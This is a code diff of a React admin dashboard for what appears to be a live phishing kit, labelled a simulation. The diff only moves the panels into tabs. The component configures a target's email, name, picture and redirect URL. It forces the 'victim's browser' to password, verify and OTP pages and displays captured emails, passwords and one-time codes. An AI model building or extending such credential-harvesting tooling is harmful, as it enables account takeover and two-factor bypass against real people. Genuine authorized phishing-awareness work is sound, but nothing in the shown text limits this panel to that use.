@@ -7,13 +7,14 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { RefreshCw, Trash2, Send } from "lucide-react";
+import { RefreshCw, Trash2 } from "lucide-react";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 
 type ConfigFormData = {
   targetEmail: string;
@@ -115,99 +116,104 @@ export function AdminDashboard() {
   };
 
   return (
-    <div className="max-w-7xl w-full mx-auto grid gap-8 md:grid-cols-3">
-      <div className="md:col-span-1">
-        <Card>
-          <CardHeader>
-            <CardTitle>Admin Configuration</CardTitle>
-            <CardDescription>Set up the target and simulation parameters.</CardDescription>
-          </CardHeader>
-          <CardContent>
-            <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-4">
-              <div>
-                <Label htmlFor="targetEmail">Target Email</Label>
-                <Input id="targetEmail" {...register("targetEmail")} />
-                {errors.targetEmail && <p className="text-sm text-destructive mt-1">{errors.targetEmail.message}</p>}
-              </div>
-              <div>
-                <Label htmlFor="targetName">Target Name</Label>
-                <Input id="targetName" {...register("targetName")} />
-                {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
-              </div>
-              <div>
-                <Label htmlFor="targetProfilePicture">Target Profile Picture URL</Label>
-                <Input id="targetProfilePicture" {...register("targetProfilePicture")} />
-                {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
-              </div>
-              <div>
-                <Label htmlFor="redirectUrl">Final Redirect URL</Label>
-                <Input id="redirectUrl" {...register("redirectUrl")} />
-                {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
-              </div>
-              <Button type="submit" className="w-full">Save Configuration</Button>
-            </form>
-          </CardContent>
-        </Card>
-      </div>
-
-      <div className="md:col-span-2">
-        <Card>
-          <CardHeader className="flex flex-row items-center justify-between">
-            <div>
-              <CardTitle>Live Attack Dashboard</CardTitle>
-              <CardDescription>Real-time monitoring of the simulation.</CardDescription>
-            </div>
-            <div className="flex items-center gap-2">
-                <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
-                <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
-            </div>
-          </CardHeader>
-          <CardContent className="space-y-6">
-            <div>
-              <h3 className="font-semibold mb-2">Victim Status</h3>
-              <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
-                <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
-                <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
-              </div>
-            </div>
-            <Separator />
-            <div>
-                <h3 className="font-semibold mb-2">Live Controls</h3>
-                <CardDescription className="mb-4">Force the victim's browser to a specific page.</CardDescription>
-                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
-                    <Button variant="outline" onClick={() => handleControlClick('password')}>Password</Button>
-                    <Button variant="outline" onClick={() => handleControlClick('verify')}>Verify</Button>
-                    <Button variant="outline" onClick={() => handleControlClick('otp')}>OTP</Button>
-                    <Button variant="outline" onClick={() => handleControlClick('redirect')}>Redirect</Button>
-                </div>
-            </div>
-            <Separator />
-            <div>
-              <h3 className="font-semibold mb-2">Captured Data</h3>
-              <div className="space-y-4">
-                <div className="p-4 bg-muted rounded-lg">
-                  <div className="font-mono text-sm">
-                    <strong>Email:</strong> {state?.victim.email || "---"}
-                  </div>
-                </div>
-                <div className="p-4 bg-muted rounded-lg space-y-2">
-                  <div className="font-mono text-sm"><strong>Passwords:</strong></div>
-                  {state?.victim.passwords && state.victim.passwords.length > 0 ? (
-                    <ul className="list-disc list-inside space-y-1">
-                      {state.victim.passwords.map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
-                    </ul>
-                  ) : <div className="font-mono text-sm">---</div>}
-                </div>
-                 <div className="p-4 bg-muted rounded-lg">
-                  <div className="font-mono text-sm">
-                    <strong>OTP:</strong> {state?.victim.otp || "---"}
-                  </div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
+    <div className="w-full max-w-4xl mx-auto">
+        <Tabs defaultValue="live" className="w-full">
+            <TabsList className="grid w-full grid-cols-2">
+                <TabsTrigger value="live">Live Attack Dashboard</TabsTrigger>
+                <TabsTrigger value="config">Admin Configuration</TabsTrigger>
+            </TabsList>
+            <TabsContent value="live">
+                <Card>
+                  <CardHeader className="flex flex-row items-center justify-between">
+                    <div>
+                      <CardTitle>Live Attack Dashboard</CardTitle>
+                      <CardDescription>Real-time monitoring of the simulation.</CardDescription>
+                    </div>
+                    <div className="flex items-center gap-2">
+                        <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
+                        <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
+                    </div>
+                  </CardHeader>
+                  <CardContent className="space-y-6">
+                    <div>
+                      <h3 className="font-semibold mb-2">Victim Status</h3>
+                      <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
+                        <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
+                        <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
+                      </div>
+                    </div>
+                    <Separator />
+                    <div>
+                        <h3 className="font-semibold mb-2">Live Controls</h3>
+                        <CardDescription className="mb-4">Force the victim's browser to a specific page.</CardDescription>
+                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
+                            <Button variant="outline" onClick={() => handleControlClick('password')}>Password</Button>
+                            <Button variant="outline" onClick={() => handleControlClick('verify')}>Verify</Button>
+                            <Button variant="outline" onClick={() => handleControlClick('otp')}>OTP</Button>
+                            <Button variant="outline" onClick={() => handleControlClick('redirect')}>Redirect</Button>
+                        </div>
+                    </div>
+                    <Separator />
+                    <div>
+                      <h3 className="font-semibold mb-2">Captured Data</h3>
+                      <div className="space-y-4">
+                        <div className="p-4 bg-muted rounded-lg">
+                          <div className="font-mono text-sm">
+                            <strong>Email:</strong> {state?.victim.email || "---"}
+                          </div>
+                        </div>
+                        <div className="p-4 bg-muted rounded-lg space-y-2">
+                          <div className="font-mono text-sm"><strong>Passwords:</strong></div>
+                          {state?.victim.passwords && state.victim.passwords.length > 0 ? (
+                            <ul className="list-disc list-inside space-y-1">
+                              {state.victim.passwords.map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
+                            </ul>
+                          ) : <div className="font-mono text-sm">---</div>}
+                        </div>
+                         <div className="p-4 bg-muted rounded-lg">
+                          <div className="font-mono text-sm">
+                            <strong>OTP:</strong> {state?.victim.otp || "---"}
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </CardContent>
+                </Card>
+            </TabsContent>
+            <TabsContent value="config">
+                <Card>
+                  <CardHeader>
+                    <CardTitle>Admin Configuration</CardTitle>
+                    <CardDescription>Set up the target and simulation parameters.</CardDescription>
+                  </CardHeader>
+                  <CardContent>
+                    <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-4">
+                      <div>
+                        <Label htmlFor="targetEmail">Target Email</Label>
+                        <Input id="targetEmail" {...register("targetEmail")} />
+                        {errors.targetEmail && <p className="text-sm text-destructive mt-1">{errors.targetEmail.message}</p>}
+                      </div>
+                      <div>
+                        <Label htmlFor="targetName">Target Name</Label>
+                        <Input id="targetName" {...register("targetName")} />
+                        {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
+                      </div>
+                      <div>
+                        <Label htmlFor="targetProfilePicture">Target Profile Picture URL</Label>
+                        <Input id="targetProfilePicture" {...register("targetProfilePicture")} />
+                        {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
+                      </div>
+                      <div>
+                        <Label htmlFor="redirectUrl">Final Redirect URL</Label>
+                        <Input id="redirectUrl" {...register("redirectUrl")} />
+                        {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
+                      </div>
+                      <Button type="submit" className="w-full">Save Configuration</Button>
+                    </form>
+                  </CardContent>
+                </Card>
+            </TabsContent>
+        </Tabs>
     </div>
   );
 }
